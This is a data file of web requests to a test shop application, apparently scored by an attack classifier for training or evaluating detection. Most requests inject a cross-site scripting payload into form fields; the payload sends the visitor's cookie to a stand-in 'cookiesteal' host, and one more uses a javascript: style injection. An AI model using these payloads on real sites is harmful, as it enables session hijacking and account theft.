idx	prob	sample
59081	0.994248	http://localhost:8080/tienda1/publico/registro.jsp?modo=registrosessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&login=paxton&password=e4TE9ADa&nombre=Hermelinda&apellidos=Llorente Batllori&email=kawazu3@alquilerpantallasled.org&dni=79540644C&direccion=Cami�o Dentagron 68, &ciudad=San Mart�n del R�o&cp=33909&prov
45433	0.993478	http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shiranth5&password=petal9192&nombre=Nelma&apellidos=Rayo Jal�n&email=dubucourt-geoffrey@intercambioenlaces.name&dni=75767112Y&direccion=Pla�a D' Espanya 36 6-E&ciudad=Penagos&cp=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&provincia=M�laga
46707	0.992933	http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ramnarin&password=o14ula2o&nombre=Fedelia&apellidos=Badia M�nico&email=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&dni=34742926T&direccion=C/ Felipe Oya Rodriguez 56 12F&ciudad=Navalilla&cp=07048&provincia=Palencia&ntc=2677666876528376&B1=
54207	0.992604	http://localhost:8080/tienda1/publico/registro.jsp?modo=registrosessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&login=wendy&password=a-h�lo&nombre=Edelvais&apellidos=Alba�il Comasoli&email=raidhi_altermen@prestamosypersonales.kw&dni=68675744K&direccion=Puerto De Canfranc 179, &ciudad=Mont�n&cp=12415&provincia=Gu
37619	0.992145	http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=emelia7&password=e6u*ipolado&nombre=Gelsomino&apellidos=Medio Bullones&email=radzum_noriega@alcantarapartners.hr&dni=15508885P&direccion=C/ Cadernera, 180, 5?C&ciudad=B�veda&cp=06360&provincia=La Rioja&ntc=3331042207803695sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'
37236	0.991430	http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=waltdisn&password=AC4iNiA&nombre=Yasmila&apellidos=Monerris Brau&email=dearden@hipermadrid.ga&dni=83203700G&direccion=C/ Flors, 115 &ciudad=Navas de Orosessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&cp=32782&provincia=Zaragoza&ntc=0851365114
57922	0.991297	http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=schaffel3&password=5ub9ltern3nte&nombre=Teinad&apellidos=Agraso Feixas&email=callam@mtos.by&dni=32857731T&direccion=C/ Leon Felipe, 31 &ciudad=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&cp=44589&provincia=Palencia&ntc=4714732630974118&B1
42325	0.991087	http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vasiliad&password=tiQU73M77UiS&nombre=Virma&apellidos=Catolino Florensa&email=ridges@fotoseroticas.com.cx&dni=67499126Z&direccion=Plza. Mayor, 166, &ciudad=Camari�as&cp=26240&provincia=Almer�a&ntc=paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2&B1=Registrar HTTP/1.1
51211	0.990868	http://localhost:8080/tienda1/publico/registro.jsp?modo=sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&login=leilah&password=c0855m05l13&nombre=Rachid&apellidos=Specie&email=tansey@cohel.tel&dni=85978887B&direccion=C/ Uruguay, 17, &ciudad=Sitges&cp=08840&provincia=Salamanca&ntc=2191408173155775&B1=Registrar HTT
42663	0.990019	http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pic&password=emba?ulada&nombre=Cruz&apellidos=Puyal Catalan&email=eastside-luco@apicultor.ms&dni=39658514Msessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script>&direccion=C/ Don Juan De Aguilar 168, &ciudad=Nava, La&cp=31284&provincia=Le�n&ntc=621753
